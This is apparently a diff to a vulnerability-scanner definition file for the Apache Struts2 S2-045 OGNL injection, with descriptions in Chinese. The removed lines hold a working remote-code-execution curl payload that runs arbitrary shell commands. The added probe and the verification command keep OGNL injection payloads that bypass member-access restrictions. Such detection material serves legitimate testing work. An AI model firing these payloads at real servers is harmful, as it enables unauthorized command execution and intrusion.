@@ -1,5 +1,6 @@
 {
   "vuln_id": "struts2_s2045",
+  "dispatch_skill": "struts2_ognl_rce",
   "description": "Apache Struts2 S2-045远程代码执行漏洞，由于Jakarta Multipart解析器对Content-Type头进行OGNL表达式求值导致",
   "category": "expression_injection",
   "cves": [
@@ -28,20 +29,25 @@
     "/showcase.action"
   ],
   "detection_method": "发送一个POST请求到目标URL，在Content-Type头中注入OGNL表达式，例如添加自定义响应头。如果响应头中出现注入的标记，则漏洞存在。",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "验证漏洞存在性，通过注入OGNL表达式执行简单计算或添加响应头",
-      "command": "curl -H \"Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','S2-045-OK')}.multipart/form-data\" http://{TARGET}/showcase.action -I",
-      "expected_result": "响应头中包含 X-Test: S2-045-OK",
-      "notes": "确保目标运行在默认端口8080，如果端口不同需调整命令"
-    },
-    {
-      "step": 2,
-      "description": "执行远程代码执行（RCE），例如运行id命令获取系统信息",
-      "command": "curl -H \"Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data\" \"http://{TARGET}/showcase.action\"",
-      "expected_result": "响应体中包含命令执行结果，如uid和gid信息",
-      "notes": "此命令执行id命令，可根据需要替换#cmd变量为其他命令；注意目标操作系统可能影响命令格式"
+      "id": "s2045_ognl_header_probe",
+      "description": "Content-Type 注入 OGNL，观察响应头回显",
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Probe',233*233))}.multipart/form-data"
+      },
+      "timeout": 10,
+      "success_signs": {
+        "header_contains": [
+          [
+            "X-Probe",
+            "54289"
+          ]
+        ]
+      },
+      "confidence": 0.95
     }
   ],
   "verification_command": "curl -H \"Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data\" http://{TARGET}/ -I",
